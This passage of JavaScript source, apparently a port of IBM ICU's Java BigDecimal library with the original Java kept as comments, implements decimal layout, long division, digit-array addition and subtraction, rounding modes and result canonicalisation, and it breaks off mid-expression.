&lt;p&gt; * The result is given by: * &lt;p&gt;&lt;code&gt; * (new BigDecimal(lint)).divide(TEN.pow(new BigDecimal(scale))) * &lt;/code&gt; * &lt;p&gt; * A &lt;code&gt;NumberFormatException&lt;/code&gt; is thrown if &lt;code&gt;scale&lt;/code&gt; * is negative. * * @param lint The &lt;code&gt;long&lt;/code&gt; to be translated. * @param scale The &lt;code&gt;int&lt;/code&gt; scale to be applied. * @return The &lt;code&gt;BigDecimal&lt;/code&gt; equal in value to * &lt;code&gt;lint&lt;/code&gt;. * @throws NumberFormatException if the scale is negative. * @stable ICU 2.0 */ //--public static com.ibm.icu.math.BigDecimal valueOf(long lint,int scale)&#123; //-- com.ibm.icu.math.BigDecimal res=null; //-- &#123;/*select*/ //-- if (lint==0) //-- res=ZERO; //-- else if (lint==1) //-- res=ONE; //-- else if (lint==10) //-- res=TEN; //-- else&#123; //-- res=new com.ibm.icu.math.BigDecimal(lint); //-- &#125; //-- &#125; //-- if (scale==0) //-- return res; //-- if (scale&lt;0) //-- throw new java.lang.NumberFormatException(\"Negative scale:\"+\" \"+scale); //-- res=clone(res); // safe copy [do not mutate] //-- res.exp=(int)-scale; // exponent is -scale //-- return res; //-- &#125; /* ---------------------------------------------------------------- */ /* Private methods */ /* ---------------------------------------------------------------- */ /* &lt;sgml&gt; Return char array value of a BigDecimal (conversion from BigDecimal to laid-out canonical char array). &lt;p&gt;The mantissa will either already have been rounded (following an operation) or will be of length appropriate (in the case of construction from an int, for example). &lt;p&gt;We must not alter the mantissa, here. &lt;p&gt;'form' describes whether we are to use exponential notation (and if so, which), or if we are to lay out as a plain/pure numeric. &lt;/sgml&gt; */ //--private char[] layout()&#123; function layout() &#123; //--char cmant[]; var cmant; //--int i=0; var i=0; //--java.lang.StringBuffer sb=null; var sb=null; //--int euse=0; var euse=0; //--int sig=0; var sig=0; //--char csign=0; var csign=0; //--char rec[]=null; var rec=null; //--int needsign; var needsign; //--int mag; var mag; //--int len=0; var len=0; cmant=new Array(this.mant.length); // copy byte[] to a char[] &#123;var $18=this.mant.length;i=0;i:for(;$18&gt;0;$18--,i++)&#123; cmant[i]=this.mant[i]+''; &#125; &#125;/*i*/ if (this.form!=MathContext.prototype.PLAIN) &#123;/* exponential notation needed */ //--sb=new java.lang.StringBuffer(cmant.length+15); // -x.xxxE+999999999 sb=\"\"; if (this.ind==this.isneg) sb += '-'; euse=(this.exp+cmant.length)-1; // exponent to use /* setup sig=significant digits and copy to result */ if (this.form==MathContext.prototype.SCIENTIFIC) &#123; // [default] sb += cmant[0]; // significant character if (cmant.length&gt;1) // have decimal part //--sb.append('.').append(cmant,1,cmant.length-1); sb += '.'; sb += cmant.slice(1).join(\"\"); &#125; else &#123;engineering:do&#123; sig=euse%3; // common if (sig&lt;0) sig=3+sig; // negative exponent euse=euse-sig; sig++; if (sig&gt;=cmant.length) &#123; // zero padding may be needed //--sb.append(cmant,0,cmant.length); sb += cmant.join(\"\"); &#123;var $19=sig-cmant.length;for(;$19&gt;0;$19--)&#123; sb += '0'; &#125; &#125; &#125; else &#123; // decimal point needed //--sb.append(cmant,0,sig).append('.').append(cmant,sig,cmant.length-sig); sb += cmant.slice(0,sig).join(\"\"); sb += '.'; sb += cmant.slice(sig).join(\"\"); &#125; &#125;while(false);&#125;/*engineering*/ if (euse!=0) &#123; if (euse&lt;0) &#123; csign='-'; euse=-euse; &#125; else csign='+'; //--sb.append('E').append(csign).append(euse); sb += 'E'; sb += csign; sb += euse; &#125; //--rec=new Array(sb.length); //--Utility.getChars(sb, 0,sb.length(),rec,0); //--return rec; return sb.split(\"\"); &#125; /* Here for non-exponential (plain) notation */ if (this.exp==0) &#123;/* easy */ if (this.ind&gt;=0) return cmant; // non-negative integer rec=new Array(cmant.length+1); rec[0]='-'; //--java.lang.System.arraycopy((java.lang.Object)cmant,0,(java.lang.Object)rec,1,cmant.length); this.arraycopy(cmant,0,rec,1,cmant.length); return rec; &#125; /* Need a '.' and/or some zeros */ needsign=((this.ind==this.isneg)?1:0); // space for sign? 0 or 1 /* MAG is the position of the point in the mantissa (index of the character it follows) */ mag=this.exp+cmant.length; if (mag&lt;1) &#123;/* 0.00xxxx form */ len=(needsign+2)-this.exp; // needsign+2+(-mag)+cmant.length rec=new Array(len); if (needsign!=0) rec[0]='-'; rec[needsign]='0'; rec[needsign+1]='.'; &#123;var $20=-mag;i=needsign+2;i:for(;$20&gt;0;$20--,i++)&#123; // maybe none rec[i]='0'; &#125; &#125;/*i*/ //--java.lang.System.arraycopy((java.lang.Object)cmant,0,(java.lang.Object)rec,(needsign+2)-mag,cmant.length); this.arraycopy(cmant,0,rec,(needsign+2)-mag,cmant.length); return rec; &#125; if (mag&gt;cmant.length) &#123;/* xxxx0000 form */ len=needsign+mag; rec=new Array(len); if (needsign!=0) rec[0]='-'; //--java.lang.System.arraycopy((java.lang.Object)cmant,0,(java.lang.Object)rec,needsign,cmant.length); this.arraycopy(cmant,0,rec,needsign,cmant.length); &#123;var $21=mag-cmant.length;i=needsign+cmant.length;i:for(;$21&gt;0;$21--,i++)&#123; // never 0 rec[i]='0'; &#125; &#125;/*i*/ return rec; &#125; /* decimal point is in the middle of the mantissa */ len=(needsign+1)+cmant.length; rec=new Array(len); if (needsign!=0) rec[0]='-'; //--java.lang.System.arraycopy((java.lang.Object)cmant,0,(java.lang.Object)rec,needsign,mag); this.arraycopy(cmant,0,rec,needsign,mag); rec[needsign+mag]='.'; //--java.lang.System.arraycopy((java.lang.Object)cmant,mag,(java.lang.Object)rec,(needsign+mag)+1,cmant.length-mag); this.arraycopy(cmant,mag,rec,(needsign+mag)+1,cmant.length-mag); return rec; &#125; /* &lt;sgml&gt; Checks a BigDecimal argument to ensure it's a true integer in a given range. &lt;p&gt;If OK, returns it as an int. &lt;/sgml&gt; */ // [currently only used by pow] //--private int intcheck(int min,int max)&#123; function intcheck(min, max) &#123; //--int i; var i; i=this.intValueExact(); // [checks for non-0 decimal part] // Use same message as though intValueExact failed due to size if ((i&lt;min)||(i&gt;max)) throw \"intcheck(): Conversion overflow: \"+i; return i; &#125; /* &lt;sgml&gt; Carry out division operations. &lt;/sgml&gt; */ /* Arg1 is operation code: D=divide, I=integer divide, R=remainder Arg2 is the rhs. Arg3 is the context. Arg4 is explicit scale iff code='D' or 'I' (-1 if none). Underlying algorithm (complications for Remainder function and scaled division are omitted for clarity): Test for x/0 and then 0/x Exp =Exp1 - Exp2 Exp =Exp +len(var1) -len(var2) Sign=Sign1 * Sign2 Pad accumulator (Var1) to double-length with 0's (pad1) Pad Var2 to same length as Var1 B2B=1st two digits of var2, +1 to allow for roundup have=0 Do until (have=digits+1 OR residue=0) if exp&lt;0 then if integer divide/residue then leave this_digit=0 Do forever compare numbers if &lt;0 then leave inner_loop if =0 then (- quick exit without subtract -) do this_digit=this_digit+1; output this_digit leave outer_loop; end Compare lengths of numbers (mantissae): If same then CA=first_digit_of_Var1 else CA=first_two_digits_of_Var1 mult=ca*10/b2b -- Good and safe guess at divisor if mult=0 then mult=1 this_digit=this_digit+mult subtract end inner_loop if have\\=0 | this_digit\\=0 then do output this_digit have=have+1; end var2=var2/10 exp=exp-1 end outer_loop exp=exp+1 -- set the proper exponent if have=0 then generate answer=0 Return to FINISHED Result defined by MATHV1 For extended commentary, see DMSRCN. */ //--private com.ibm.icu.math.BigDecimal dodivide(char code,com.ibm.icu.math.BigDecimal rhs,com.ibm.icu.math.MathContext set,int scale)&#123; function dodivide(code, rhs, set, scale) &#123; //--com.ibm.icu.math.BigDecimal lhs; var lhs; //--int reqdig; var reqdig; //--int newexp; var newexp; //--com.ibm.icu.math.BigDecimal res; var res; //--int newlen; var newlen; //--byte var1[]; var var1; //--int var1len; var var1len; //--byte var2[]; var var2; //--int var2len; var var2len; //--int b2b; var b2b; //--int have; var have; //--int thisdigit=0; var thisdigit=0; //--int i=0; var i=0; //--byte v2=0; var v2=0; //--int ba=0; var ba=0; //--int mult=0; var mult=0; //--int start=0; var start=0; //--int padding=0; var padding=0; //--int d=0; var d=0; //--byte newvar1[]=null; var newvar1=null; //--byte lasthave=0; var lasthave=0; //--int actdig=0; var actdig=0; //--byte newmant[]=null; var newmant=null; if (set.lostDigits) this.checkdigits(rhs,set.digits); lhs=this; // name for clarity // [note we must have checked lostDigits before the following checks] if (rhs.ind==0) throw \"dodivide(): Divide by 0\"; // includes 0/0 if (lhs.ind==0) &#123; // 0/x =&gt; 0 [possibly with .0s] if (set.form!=MathContext.prototype.PLAIN) return this.ZERO; if (scale==(-1)) return lhs; return lhs.setScale(scale); &#125; /* Prepare numbers according to BigDecimal rules */ reqdig=set.digits; // local copy (heavily used) if (reqdig&gt;0) &#123; if (lhs.mant.length&gt;reqdig) lhs=this.clone(lhs).round(set); if (rhs.mant.length&gt;reqdig) rhs=this.clone(rhs).round(set); &#125; else &#123;/* scaled divide */ if (scale==(-1)) scale=lhs.scale(); // set reqdig to be at least large enough for the computation reqdig=lhs.mant.length; // base length // next line handles both positive lhs.exp and also scale mismatch if (scale!=(-lhs.exp)) reqdig=(reqdig+scale)+lhs.exp; reqdig=(reqdig-((rhs.mant.length-1)))-rhs.exp; // reduce by RHS effect if (reqdig&lt;lhs.mant.length) reqdig=lhs.mant.length; // clamp if (reqdig&lt;rhs.mant.length) reqdig=rhs.mant.length; // .. &#125; /* precalculate exponent */ newexp=((lhs.exp-rhs.exp)+lhs.mant.length)-rhs.mant.length; /* If new exponent -ve, then some quick exits are possible */ if (newexp&lt;0) if (code!='D') &#123; if (code=='I') return this.ZERO; // easy - no integer part /* Must be 'R'; remainder is [finished clone of] input value */ return this.clone(lhs).finish(set,false); &#125; /* We need slow division */ res=new BigDecimal(); // where we'll build result res.ind=(lhs.ind*rhs.ind); // final sign (for D/I) res.exp=newexp; // initial exponent (for D/I) res.mant=this.createArrayWithZeros(reqdig+1); // where build the result /* Now [virtually pad the mantissae with trailing zeros */ // Also copy the LHS, which will be our working array newlen=(reqdig+reqdig)+1; var1=this.extend(lhs.mant,newlen); // always makes longer, so new safe array var1len=newlen; // [remaining digits are 0] var2=rhs.mant; var2len=newlen; /* Calculate first two digits of rhs (var2), +1 for later estimations */ b2b=(var2[0]*10)+1; if (var2.length&gt;1) b2b=b2b+var2[1]; /* start the long-division loops */ have=0; &#123;outer:for(;;)&#123; thisdigit=0; /* find the next digit */ &#123;inner:for(;;)&#123; if (var1len&lt;var2len) break inner; // V1 too low if (var1len==var2len) &#123; // compare needed &#123;compare:do&#123; // comparison &#123;var $22=var1len;i=0;i:for(;$22&gt;0;$22--,i++)&#123; // var1len is always &lt;= var1.length if (i&lt;var2.length) v2=var2[i]; else v2=0; if (var1[i]&lt;v2) break inner; // V1 too low if (var1[i]&gt;v2) break compare; // OK to subtract &#125; &#125;/*i*/ /* reach here if lhs and rhs are identical; subtraction will increase digit by one, and the residue will be 0 so we are done; leave the loop with residue set to 0 (in case code is 'R' or ROUND_UNNECESSARY or a ROUND_HALF_xxxx is being checked) */ thisdigit++; res.mant[have]=thisdigit; have++; var1[0]=0; // residue to 0 [this is all we'll test] // var1len=1 -- [optimized out] break outer; &#125;while(false);&#125;/*compare*/ /* prepare for subtraction. Estimate BA (lengths the same) */ ba=var1[0]; // use only first digit &#125; // lengths the same else &#123;/* lhs longer than rhs */ /* use first two digits for estimate */ ba=var1[0]*10; if (var1len&gt;1) ba=ba+var1[1]; &#125; /* subtraction needed; V1&gt;=V2 */ mult=div((ba*10),b2b); if (mult==0) mult=1; thisdigit=thisdigit+mult; // subtract; var1 reusable var1=this.byteaddsub(var1,var1len,var2,var2len,-mult,true); if (var1[0]!=0) continue inner; // maybe another subtract needed /* V1 now probably has leading zeros, remove leading 0's and try again. (It could be longer than V2) */ &#123;var $23=var1len-2;start=0;start:for(;start&lt;=$23;start++)&#123; if (var1[start]!=0) break start; var1len--; &#125; &#125;/*start*/ if (start==0) continue inner; // shift left //--java.lang.System.arraycopy((java.lang.Object)var1,start,(java.lang.Object)var1,0,var1len); this.arraycopy(var1,start,var1,0,var1len); &#125; &#125;/*inner*/ /* We have the next digit */ if ((have!=0)||(thisdigit!=0)) &#123; // put the digit we got res.mant[have]=thisdigit; have++; if (have==(reqdig+1)) break outer; // we have all we need if (var1[0]==0) break outer; // residue now 0 &#125; /* can leave now if a scaled divide and exponent is small enough */ if (scale&gt;=0) if ((-res.exp)&gt;scale) break outer; /* can leave now if not Divide and no integer part left */ if (code!='D') if (res.exp&lt;=0) break outer; res.exp=res.exp-1; // reduce the exponent /* to get here, V1 is less than V2, so divide V2 by 10 and go for the next digit */ var2len--; &#125; &#125;/*outer*/ /* here when we have finished dividing, for some reason */ // have is the number of digits we collected in res.mant if (have==0) have=1; // res.mant[0] is 0; we always want a digit if ((code=='I')||(code=='R')) &#123;/* check for integer overflow needed */ if ((have+res.exp)&gt;reqdig) throw \"dodivide(): Integer overflow\"; if (code=='R') &#123;remainder:do&#123; /* We were doing Remainder -- return the residue */ if (res.mant[0]==0) // no integer part was found return this.clone(lhs).finish(set,false); // .. so return lhs, canonical if (var1[0]==0) return this.ZERO; // simple 0 residue res.ind=lhs.ind; // sign is always as LHS /* Calculate the exponent by subtracting the number of padding zeros we added and adding the original exponent */ padding=((reqdig+reqdig)+1)-lhs.mant.length; res.exp=(res.exp-padding)+lhs.exp; /* strip insignificant padding zeros from residue, and create/copy the resulting mantissa if need be */ d=var1len; &#123;i=d-1;i:for(;i&gt;=1;i--)&#123;if(!((res.exp&lt;lhs.exp)&amp;&amp;(res.exp&lt;rhs.exp)))break; if (var1[i]!=0) break i; d--; res.exp=res.exp+1; &#125; &#125;/*i*/ if (d&lt;var1.length) &#123;/* need to reduce */ newvar1=new Array(d); //--java.lang.System.arraycopy((java.lang.Object)var1,0,(java.lang.Object)newvar1,0,d); // shorten this.arraycopy(var1,0,newvar1,0,d); var1=newvar1; &#125; res.mant=var1; return res.finish(set,false); &#125;while(false);&#125;/*remainder*/ &#125; else &#123;/* 'D' -- no overflow check needed */ // If there was a residue then bump the final digit (iff 0 or 5) // so that the residue is visible for ROUND_UP, ROUND_HALF_xxx and // ROUND_UNNECESSARY checks (etc.) later. // [if we finished early, the residue will be 0] if (var1[0]!=0) &#123; // residue not 0 lasthave=res.mant[have-1]; if (((lasthave%5))==0) res.mant[have-1]=(lasthave+1); &#125; &#125; /* Here for Divide or Integer Divide */ // handle scaled results first ['I' always scale 0, optional for 'D'] if (scale&gt;=0) &#123;scaled:do&#123; // say 'scale have res.exp len' scale have res.exp res.mant.length if (have!=res.mant.length) // already padded with 0's, so just adjust exponent res.exp=res.exp-((res.mant.length-have)); // calculate number of digits we really want [may be 0] actdig=res.mant.length-(((-res.exp)-scale)); res.round(actdig,set.roundingMode); // round to desired length // This could have shifted left if round (say) 0.9-&gt;1[.0] // Repair if so by adding a zero and reducing exponent if (res.exp!=(-scale)) &#123; res.mant=this.extend(res.mant,res.mant.length+1); res.exp=res.exp-1; &#125; return res.finish(set,true); // [strip if not PLAIN] &#125;while(false);&#125;/*scaled*/ // reach here only if a non-scaled if (have==res.mant.length) &#123; // got digits+1 digits res.round(set); have=reqdig; &#125; else &#123;/* have&lt;=reqdig */ if (res.mant[0]==0) return this.ZERO; // fastpath // make the mantissa truly just 'have' long // [we could let finish do this, during strip, if we adjusted // the exponent; however, truncation avoids the strip loop] newmant=new Array(have); // shorten //--java.lang.System.arraycopy((java.lang.Object)res.mant,0,(java.lang.Object)newmant,0,have); this.arraycopy(res.mant,0,newmant,0,have); res.mant=newmant; &#125; return res.finish(set,true); &#125; /* &lt;sgml&gt; Report a conversion exception. &lt;/sgml&gt; */ //--private void bad(char s[])&#123; function bad(prefix, s) &#123; throw prefix + \"Not a number: \"+s; &#125; /* &lt;sgml&gt; Report a bad argument to a method. &lt;/sgml&gt; Arg1 is method name Arg2 is argument position Arg3 is what was found */ //--private void badarg(java.lang.String name,int pos,java.lang.String value)&#123; function badarg(name, pos, value) &#123; throw \"Bad argument \"+pos+\" to \"+name+\": \"+value; &#125; /* &lt;sgml&gt; Extend byte array to given length, padding with 0s. If no extension is required then return the same array. &lt;/sgml&gt; Arg1 is the source byte array Arg2 is the new length (longer) */ //--private static final byte[] extend(byte inarr[],int newlen)&#123; function extend(inarr, newlen) &#123; //--byte newarr[]; var newarr; if (inarr.length==newlen) return inarr; newarr=createArrayWithZeros(newlen); //--java.lang.System.arraycopy((java.lang.Object)inarr,0,(java.lang.Object)newarr,0,inarr.length); this.arraycopy(inarr,0,newarr,0,inarr.length); // 0 padding is carried out by the JVM on allocation initialization return newarr; &#125; /* &lt;sgml&gt; Add or subtract two &gt;=0 integers in byte arrays &lt;p&gt;This routine performs the calculation: &lt;pre&gt; C=A+(B*M) &lt;/pre&gt; Where M is in the range -9 through +9 &lt;p&gt; If M&lt;0 then A&gt;=B must be true, so the result is always non-negative. Leading zeros are not removed after a subtraction. The result is either the same length as the longer of A and B, or 1 longer than that (if a carry occurred). A is not altered unless Arg6 is 1. B is never altered. Arg1 is A Arg2 is A length to use (if longer than A, pad with 0's) Arg3 is B Arg4 is B length to use (if longer than B, pad with 0's) Arg5 is M, the multiplier Arg6 is 1 if A can be used to build the result (if it fits) This routine is severely performance-critical; *any* change here must be measured (timed) to assure no performance degradation. */ // 1996.02.20 -- enhanced version of DMSRCN algorithm (1981) // 1997.10.05 -- changed to byte arrays (from char arrays) // 1998.07.01 -- changed to allow destructive reuse of LHS // 1998.07.01 -- changed to allow virtual lengths for the arrays // 1998.12.29 -- use lookaside for digit/carry calculation // 1999.08.07 -- avoid multiply when mult=1, and make db an int // 1999.12.22 -- special case m=-1, also drop 0 special case //--private static final byte[] byteaddsub(byte a[],int avlen,byte b[],int bvlen,int m,boolean reuse)&#123; function byteaddsub(a, avlen, b, bvlen, m, reuse) &#123; //--int alength; var alength; //--int blength; var blength; //--int ap; var ap; //--int bp; var bp; //--int maxarr; var maxarr; //--byte reb[]; var reb; //--boolean quickm; var quickm; //--int digit; var digit; //--int op=0; var op=0; //--int dp90=0; var dp90=0; //--byte newarr[]; var newarr; //--int i=0; var i=0; // We'll usually be right if we assume no carry alength=a.length; // physical lengths blength=b.length; // .. ap=avlen-1; // -&gt; final (rightmost) digit bp=bvlen-1; // .. maxarr=bp; if (maxarr&lt;ap) maxarr=ap; reb=null; // result byte array if (reuse) if ((maxarr+1)==alength) reb=a; // OK to reuse A if (reb==null)&#123; reb=this.createArrayWithZeros(maxarr+1); // need new array &#125; quickm=false; // 1 if no multiply needed if (m==1) quickm=true; // most common else if (m==(-1)) quickm=true; // also common digit=0; // digit, with carry or borrow &#123;op=maxarr;op:for(;op&gt;=0;op--)&#123; if (ap&gt;=0) &#123; if (ap&lt;alength) digit=digit+a[ap]; // within A ap--; &#125; if (bp&gt;=0) &#123; if (bp&lt;blength) &#123; // within B if (quickm) &#123; if (m&gt;0) digit=digit+b[bp]; // most common else digit=digit-b[bp]; // also common &#125; else digit=digit+(b[bp]*m); &#125; bp--; &#125; /* result so far (digit) could be -90 through 99 */ if (digit&lt;10) if (digit&gt;=0) &#123;quick:do&#123; // 0-9 reb[op]=digit; digit=0; // no carry continue op; &#125;while(false);&#125;/*quick*/ dp90=digit+90; reb[op]=this.bytedig[dp90]; // this digit digit=this.bytecar[dp90]; // carry or borrow &#125; &#125;/*op*/ if (digit==0) return reb; // no carry // following line will become an Assert, later // if digit&lt;0 then signal ArithmeticException(\"internal.error [\"digit\"]\") /* We have carry -- need to make space for the extra digit */ newarr=null; if (reuse) if ((maxarr+2)==a.length) newarr=a; // OK to reuse A if (newarr==null) newarr=new Array(maxarr+2); newarr[0]=digit; // the carried digit .. // .. and all the rest [use local loop for short numbers] //--if (maxarr&lt;10) &#123;var $24=maxarr+1;i=0;i:for(;$24&gt;0;$24--,i++)&#123; newarr[i+1]=reb[i]; &#125; &#125;/*i*/ //--else //--java.lang.System.arraycopy((java.lang.Object)reb,0,(java.lang.Object)newarr,1,maxarr+1); return newarr; &#125; /* &lt;sgml&gt; Initializer for digit array properties (lookaside). &lt;/sgml&gt; Returns the digit array, and initializes the carry array. */ //--private static final byte[] diginit()&#123; function diginit() &#123; //--byte work[]; var work; //--int op=0; var op=0; //--int digit=0; var digit=0; work=new Array((90+99)+1); &#123;op=0;op:for(;op&lt;=(90+99);op++)&#123; digit=op-90; if (digit&gt;=0) &#123; work[op]=(digit%10); BigDecimal.prototype.bytecar[op]=(div(digit,10)); // calculate carry continue op; &#125; // borrowing... digit=digit+100; // yes, this is right [consider -50] work[op]=(digit%10); BigDecimal.prototype.bytecar[op]=((div(digit,10))-10); // calculate borrow [NB: - after %] &#125; &#125;/*op*/ return work; &#125; /* &lt;sgml&gt; Create a copy of BigDecimal object for local use. &lt;p&gt;This does NOT make a copy of the mantissa array. &lt;/sgml&gt; Arg1 is the BigDecimal to clone (non-null) */ //--private static final com.ibm.icu.math.BigDecimal clone(com.ibm.icu.math.BigDecimal dec)&#123; function clone(dec) &#123; //--com.ibm.icu.math.BigDecimal copy; var copy; copy=new BigDecimal(); copy.ind=dec.ind; copy.exp=dec.exp; copy.form=dec.form; copy.mant=dec.mant; return copy; &#125; /* &lt;sgml&gt; Check one or two numbers for lost digits. &lt;/sgml&gt; Arg1 is RHS (or null, if none) Arg2 is current DIGITS setting returns quietly or throws an exception */ //--private void checkdigits(com.ibm.icu.math.BigDecimal rhs,int dig)&#123; function checkdigits(rhs, dig) &#123; if (dig==0) return; // don't check if digits=0 // first check lhs... if (this.mant.length&gt;dig) if ((!(this.allzero(this.mant,dig)))) throw \"Too many digits: \"+this.toString(); if (rhs==null) return; // monadic if (rhs.mant.length&gt;dig) if ((!(this.allzero(rhs.mant,dig)))) throw \"Too many digits: \"+rhs.toString(); return; &#125; /* &lt;sgml&gt; Round to specified digits, if necessary. &lt;/sgml&gt; Arg1 is requested MathContext [with length and rounding mode] returns this, for convenience */ //--private com.ibm.icu.math.BigDecimal round(com.ibm.icu.math.MathContext set)&#123; //-- return round(set.digits,set.roundingMode); //-- &#125; /* &lt;sgml&gt; Round to specified digits, if necessary. Arg1 is requested length (digits to round to) [may be &lt;=0 when called from format, dodivide, etc.] Arg2 is rounding mode returns this, for convenience ind and exp are adjusted, but not cleared for a mantissa of zero The length of the mantissa returned will be Arg1, except when Arg1 is 0, in which case the returned mantissa length will be 1. &lt;/sgml&gt; */ //private com.ibm.icu.math.BigDecimal round(int len,int mode)&#123; function round() &#123; var len; var mode; if (round.arguments.length == 2) &#123; len = round.arguments[0]; mode = round.arguments[1]; &#125; else if (round.arguments.length == 1) &#123; var set = round.arguments[0]; len = set.digits; mode = set.roundingMode; &#125; else &#123; throw \"round(): \" + round.arguments.length + \" arguments given; expected 1 or 2\"; &#125; //int adjust; var adjust; //int sign; var sign; //byte oldmant[]; var oldmant; //boolean reuse=false; var reuse=false; //--byte first=0; var first=0; //--int increment; var increment; //--byte newmant[]=null; var newmant=null; adjust=this.mant.length-len; if (adjust&lt;=0) return this; // nowt to do this.exp=this.exp+adjust; // exponent of result sign=this.ind; // save [assumes -1, 0, 1] oldmant=this.mant; // save if (len&gt;0) &#123; // remove the unwanted digits this.mant=new Array(len); //--java.lang.System.arraycopy((java.lang.Object)oldmant,0,(java.lang.Object)mant,0,len); this.arraycopy(oldmant,0,this.mant,0,len); reuse=true; // can reuse mantissa first=oldmant[len]; // first of discarded digits &#125; else &#123;/* len&lt;=0 */ this.mant=this.ZERO.mant; this.ind=this.iszero; reuse=false; // cannot reuse mantissa if (len==0) first=oldmant[0]; else first=0; // [virtual digit] &#125; // decide rounding adjustment depending on mode, sign, and discarded digits increment=0; // bumper &#123;modes:do&#123;/*select*/ if (mode==this.ROUND_HALF_UP) &#123; // default first [most common] if (first&gt;=5) increment=sign; &#125; else if (mode==this.ROUND_UNNECESSARY) &#123; // default for setScale() // discarding any non-zero digits is an error if ((!(this.allzero(oldmant,len)))) throw \"round(): Rounding necessary\"; &#125; else if (mode==this.ROUND_HALF_DOWN) &#123; // 0.5000 goes down if (first&gt;5) increment=sign; else if (first==5) if ((!(this.allzero(oldmant,len+1)))) increment=sign; &#125; else if (mode==this.ROUND_HALF_EVEN) &#123; // 0.5000 goes down if left digit even if (first&gt;5) increment=sign; else if (first==5) &#123; if ((!(this.allzero(oldmant,len+1)))) increment=sign; else /* 0.5000 */ if ((((this.mant[this.mant.length-1])%2))==1) increment=sign; &#125; &#125; else if (mode==this.ROUND_DOWN) &#123;&#125; // never increment else if (mode==this.ROUND_UP) &#123; // increment if discarded non-zero if ((!(this.allzero(oldmant,len)))) increment=sign; &#125; else if (mode==this.ROUND_CEILING) &#123; // more positive if (sign&gt;0) if ((!(this.allzero(oldmant,len)))) increment=sign; &#125; else if (mode==this.ROUND_FLOOR) &#123; // more negative if (sign&lt;0) if ((!(this.allzero(oldmant,len)))) increment=sign; &#125; else&#123; throw \"round(): Bad round value: \"+mode; &#125; &#125;while(false);&#125;/*modes*/ if (increment!=0) &#123;bump:do&#123; if (this.ind==this.iszero) &#123; // we must not subtract from 0, but result is trivial anyway this.mant=this.ONE.mant; this.ind=increment; &#125; else &#123; // mantissa is non-0; we can safely add or subtract 1 if (this.ind==this.isneg) increment=-increment; newmant=this.byteaddsub(this.mant,this.mant.length,this.ONE.mant,1,increment,reuse); if (newmant.length&gt;this.mant.length) &#123; // had a carry // drop rightmost digit and raise exponent this.exp++; // mant is already the correct length //java.lang.System.arraycopy((java.lang.Object)newmant,0,(java.lang.Object)mant,0,mant.length); this.arraycopy(newmant,0,this.mant,0,this.mant.length); &#125; else this.mant=newmant; &#125; &#125;while(false);&#125;/*bump*/ // rounding can increase exponent significantly if (this.exp&gt;this.MaxExp) throw \"round(): Exponent Overflow: \"+this.exp; return this; &#125; /* &lt;sgml&gt; Test if rightmost digits are all 0. Arg1 is a mantissa array to test Arg2 is the offset of first digit to check [may be negative; if so, digits to left are 0's] returns 1 if all the digits starting at Arg2 are 0 Arg2 may be beyond array bounds, in which case 1 is returned &lt;/sgml&gt; */ //--private static final boolean allzero(byte array[],int start)&#123; function allzero(array, start) &#123; //--int i=0; var i=0; if (start&lt;0) start=0; &#123;var $25=array.length-1;i=start;i:for(;i&lt;=$25;i++)&#123; if (array[i]!=0) return false; &#125; &#125;/*i*/ return true; &#125; /* &lt;sgml&gt; Carry out final checks and canonicalization &lt;p&gt; This finishes off the current number by: 1. Rounding if necessary (NB: length includes leading zeros) 2. Stripping trailing zeros (if requested and \\PLAIN) 3. Stripping leading zeros (always) 4. Selecting exponential notation (if required) 5. Converting a zero result to just '0' (if \\PLAIN) In practice, these operations overlap and share code. It always sets form. &lt;/sgml&gt; Arg1 is requested MathContext (length to round to, trigger, and FORM) Arg2 is 1 if trailing insignificant zeros should be removed after round (for division, etc.), provided that set.form isn't PLAIN. returns this, for convenience */ //--private com.ibm.icu.math.BigDecimal finish(com.ibm.icu.math.MathContext set,boolean strip)&#123; function finish(set, strip) &#123; //--int d=0; var d=0; //--int i=0; var i=0; //--byte newmant[]=null; var newmant=null; //--int mag=0; var mag=0; //--int sig=0; var sig=0; /* Round if mantissa too long and digits requested */ if (set.digits!=0) if (this.mant.length&gt;set.digits) this.round(set); /* If strip requested (and standard formatting), remove insignificant trailing zeros. */ if (strip) if (set.form!=MathContext.prototype.PLAIN) &#123; d=this.mant.length; /* see if we need to drop any trailing zeros */ &#123;i=d-1;i:for(;i&gt;=1;i--)&#123; if (this.mant[i]!=0) break i; d--; this.exp++; &#125; &#125;/*i*/ if (d&lt;this.mant.length) &#123;/* need to reduce */ newmant=new Array(d); //--java.lang.System.arraycopy((java.lang.Object)this.mant,0,(java.lang.Object)newmant,0,d); this.arraycopy(this.mant,0,newmant,0,d); this.mant=newmant; &#125; &#125; this.form=MathContext.prototype.PLAIN; // preset /* Now check for leading- and all- zeros in mantissa */ &#123;var $26=this.mant.length;i=0;i:for(;$26&gt;0;$26--,i++)&#123; if (this.mant[i]!=0) &#123; // non-0 result; ind will be correct // remove leading zeros [e.g., after subtract] if (i&gt;0) &#123;delead:do&#123; newmant=new Array(this.mant.length-i); //--java.lang.System.arraycopy((java.lang.Object)this.mant,i,(java.lang.Object)newmant,0,this.mant.length-i); this.arraycopy(this.mant,i,newmant,0,this.mant.length-i); this.mant=newmant; &#125;while(false);&#125;/*delead*/ // now determine form if not PLAIN mag=this.exp+this.mant.length; if (mag&gt;0) &#123; // most common path if (mag&gt;set.digits) if (set.digits!=0) this.form=set.form; if ((mag-1)&lt;=this.MaxExp) return this; // no overflow; quick return &#125; else if (mag&lt;(-5)) this.form=set.form; /* check for overflow */ mag--; if ((mag&lt;this.MinExp)||(mag&gt;this.MaxExp)) &#123;overflow:do&#123; // possible reprieve if form is engineering if (this.form==MathContext.prototype.ENGINEERING) &#123; sig=mag%3; // leftover if (sig&lt;0) sig=3+sig; // negative exponent mag=mag-sig; // exponent to use // 1999.06.29: second test here must be MaxExp if (mag&gt;=this.MinExp) if (mag&lt;=this.MaxExp) break overflow; &#125; throw \"finish(): Exponent Overflow: \"+mag; &#125;while(false);&#125;/*overflow*/ return this; &#125; &#125; &#125;/*i*/ // Drop through to here only if mantissa is all zeros this.ind=this.iszero; &#123;/*select*/ if (set.form!=MathContext.prototype.PLAIN) this.exp=0; // standard result; go to '0' else if (this.exp&gt;0) this.exp=0; // +ve exponent also goes to '0' else&#123; // a plain number with -ve exponent; preserve and check exponent if (this.exp&lt;this.MinExp) throw \"finish(): Exponent Overflow: \"+this.exp; &#125; &#125; this.mant=this.ZERO.mant; // canonical mantissa return this; &#125; function isGreaterThan(other) &#123; return this.compareTo(other) &gt; 0; &#125;; function isLessThan(other) &#123; return this.compareTo(other) &lt; 0; &#125;; function isGreaterThanOrEqualTo(other) &#123; return this.compareTo(other) &gt;= 